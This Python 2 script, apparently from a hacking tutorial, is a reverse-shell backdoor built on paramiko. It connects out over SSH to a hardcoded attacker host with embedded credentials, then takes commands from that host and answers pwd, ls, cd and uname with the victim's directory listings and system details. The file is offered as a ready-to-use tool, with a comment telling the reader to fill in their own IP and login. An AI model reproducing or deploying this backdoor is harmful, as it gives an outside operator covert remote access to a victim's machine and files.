import paramiko #importing paramiko . First install paramiko library
import os #import OS for os commands


def connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('192.168.1.22',username='Priyank', password='123')#replace IP , ID , Password
    chan = client.get_transport().open_session()
    chan.send("Hey i'm connected here :) ")#connection started
    print chan.recv(1024)


    while True:#if true then start this
        
        command =  chan.recv(1024)#receive command first
        if 'terminate' in command:      #if command is terminate then close            
            chan.close()
            break #break and exit


        elif 'pwd' in command:                  #if command is pwd then this
            chan.send( "[+] CWD Is " + os.getcwd() )#print current working directory

        elif 'ls' in command:#if command is ls then  this
            dirs = os.listdir( os.getcwd() )#list directory 
            chan.send(str(dirs))
  
        
        elif 'cd' in command: #if command is cd then change directory
            try:
                code,directory = command.split ('*')#syntax is cd*location 
                os.chdir(directory)#change directory command 
                chan.send( "[+] CWD Is " + os.getcwd() )#show current working directory 
            except:
                chan.send( "[-] Error, Double check the Dir" )#if error is there 

        elif 'uname' in command:
            chan.send ( str(os.uname()) ) #find details about OS

connect()#start connect function
#subscribe www.youtube.com/priyankgada







